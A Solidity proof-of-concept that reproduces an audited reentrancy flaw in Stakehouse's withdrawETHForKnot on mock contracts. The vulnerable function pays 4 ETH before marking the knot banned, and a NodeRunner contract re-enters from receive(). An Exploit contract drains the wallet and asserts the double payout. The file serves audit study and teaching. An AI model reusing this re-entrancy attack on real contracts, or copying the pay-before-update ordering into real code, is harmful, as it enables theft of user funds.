// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Stakehouse — LiquidStakingManager.withdrawETHForKnot (Trust, finding 43028).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    withdrawETHForKnot is the audited body. rawExecute sends 4 ETH, and only
    then writes bannedBLSPublicKeys. A contract recipient re-enters from
    receive() and is paid a second 4 ETH for the same knot. The smart wallet
    was holding 8 ETH for two knots and should have kept 4 ETH. It ends at 0. */

interface IDataStructures {
    enum LifecycleStatus {
        UNBEGUN,
        INITIALS_REGISTERED,
        DEPOSIT_COMPLETED
    }
}

interface IOwnableSmartWallet {
    function rawExecute(address target, bytes memory callData, uint256 value) external payable returns (bytes memory);
}

contract MockAccountManager {
    mapping(bytes32 => IDataStructures.LifecycleStatus) internal lifecycle;

    function blsPublicKeyToLifecycleStatus(bytes calldata key) external view returns (IDataStructures.LifecycleStatus) {
        return lifecycle[keccak256(key)];
    }

    function setLifecycleStatus(bytes calldata key, IDataStructures.LifecycleStatus status) external {
        lifecycle[keccak256(key)] = status;
    }
}

/// Wallet stand-in. rawExecute is the audited ETH send: a full-gas call, so
/// the recipient's receive() can re-enter the manager before the call returns.
contract OwnableSmartWallet is IOwnableSmartWallet {
    address public owner;

    function setOwner(address _owner) external {
        require(owner == address(0), "owner set");
        owner = _owner;
    }

    function rawExecute(address target, bytes memory callData, uint256 value)
        external
        payable
        returns (bytes memory)
    {
        require(msg.sender == owner, "only owner");
        (bool result, bytes memory message) = target.call{value: value}(callData);
        require(result, "Failed to execute");
        return message;
    }
}

contract LiquidStakingManager {
    event ETHWithdrawnFromSmartWallet(address indexed associatedSmartWallet, bytes blsPublicKeyOfKnot, address nodeRunner);

    MockAccountManager public accountManager;
    OwnableSmartWallet public wallet;

    mapping(bytes => address) public smartWalletOfKnot;
    mapping(address => address) public smartWalletOfNodeRunner;
    mapping(address => address) public nodeRunnerOfSmartWallet;
    mapping(bytes => address) public bannedBLSPublicKeys;
    mapping(address => bool) public bannedNodeRunners;

    constructor(MockAccountManager _accountManager, OwnableSmartWallet _wallet) {
        accountManager = _accountManager;
        wallet = _wallet;
    }

    function getAccountManager() public view returns (MockAccountManager) {
        return accountManager;
    }

    /// Post-registration state from the report's harness: one node-runner
    /// contract, two knots on its wallet, both still INITIALS_REGISTERED.
    function seedKnots(address nodeRunner, bytes calldata knotA, bytes calldata knotB) external {
        require(smartWalletOfNodeRunner[nodeRunner] == address(0), "seeded");
        smartWalletOfNodeRunner[nodeRunner] = address(wallet);
        nodeRunnerOfSmartWallet[address(wallet)] = nodeRunner;
        smartWalletOfKnot[knotA] = address(wallet);
        smartWalletOfKnot[knotB] = address(wallet);
        accountManager.setLifecycleStatus(knotA, IDataStructures.LifecycleStatus.INITIALS_REGISTERED);
        accountManager.setLifecycleStatus(knotB, IDataStructures.LifecycleStatus.INITIALS_REGISTERED);
    }

    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public view returns (bool) {
        return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0);
    }

    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public view returns (bool) {
        return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0);
    }

    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {
        return bannedNodeRunners[_nodeRunner];
    }

    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.
    /// @dev A banned node runner cannot withdraw ETH for the KNOT.
    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn
    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {
        require(_recipient != address(0), "Zero address");
        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");

        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];
        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");
        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");
        require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");
        require(
            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Initials not registered"
        );

        // @> VULN: rawExecute pays 4 ETH before bannedBLSPublicKeys is written, so receive() can re-enter and take another 4 ETH
        // refund 4 ether from smart wallet to node runner's EOA
        IOwnableSmartWallet(associatedSmartWallet).rawExecute(
            _recipient,
            "",
            4 ether
        );

        // FIX: write bannedBLSPublicKeys before rawExecute, so the second entry hits the ban and reverts
        // update the mapping
        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;

        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);
    }
}

/// The report's NonEOARepresentative. receive() calls back into withdraw before
/// the manager has banned the knot. The flag stops a third entry: a further
/// 4 ETH pull would revert on the empty wallet and undo both payouts.
contract NodeRunner {
    LiquidStakingManager public manager;
    bytes public knot;
    bool public reentered;
    uint256 public extracted;
    uint256 public secondPayout;

    constructor(LiquidStakingManager _manager, bytes memory _knot) {
        manager = _manager;
        knot = _knot;
    }

    function withdraw() external {
        manager.withdrawETHForKnot(address(this), knot);
    }

    /// Second 4 ETH only. External so that payout is its own trace step.
    function recordSecond(uint256 amount) external {
        require(msg.sender == address(this), "self");
        secondPayout = amount;
    }

    receive() external payable {
        extracted += msg.value;
        if (!reentered) {
            reentered = true;
            this.withdraw();
        } else {
            this.recordSecond(msg.value);
        }
    }
}

contract Exploit {
    MockAccountManager public accountManager;
    OwnableSmartWallet public wallet;
    LiquidStakingManager public manager;
    NodeRunner public runner;
    bytes public knot1;
    bytes public knot2;
    uint256 public entitled;
    uint256 public walletBefore;
    uint256 public extracted;
    uint256 public secondPayout;
    uint256 public shortfall;

    constructor() {
        // CREATE nonce 1 MockAccountManager, 2 OwnableSmartWallet,
        // 3 LiquidStakingManager, 4 NodeRunner.
        knot1 = bytes("publicKeys1");
        knot2 = bytes("publicKeys2");
        accountManager = new MockAccountManager();
        wallet = new OwnableSmartWallet();
        manager = new LiquidStakingManager(accountManager, wallet);
        wallet.setOwner(address(manager));
        runner = new NodeRunner(manager, knot1);
        manager.seedKnots(address(runner), knot1, knot2);
    }

    function run() external {
        entitled = 4 ether;
        walletBefore = address(wallet).balance;
        require(walletBefore == 8 ether, "wallet should custody 8 ETH");
        runner.withdraw();
        extracted = runner.extracted();
        secondPayout = runner.secondPayout();
        shortfall = entitled - address(wallet).balance;
        require(extracted == 8 ether, "extracted 8 ETH");
        require(secondPayout == 4 ether, "second payout was 4 ETH");
        require(address(wallet).balance == 0, "wallet drained");
        require(shortfall == 4 ether, "wallet short 4 ETH");
        require(manager.isBLSPublicKeyBanned(knot2) == false, "second knot still live");
    }
}
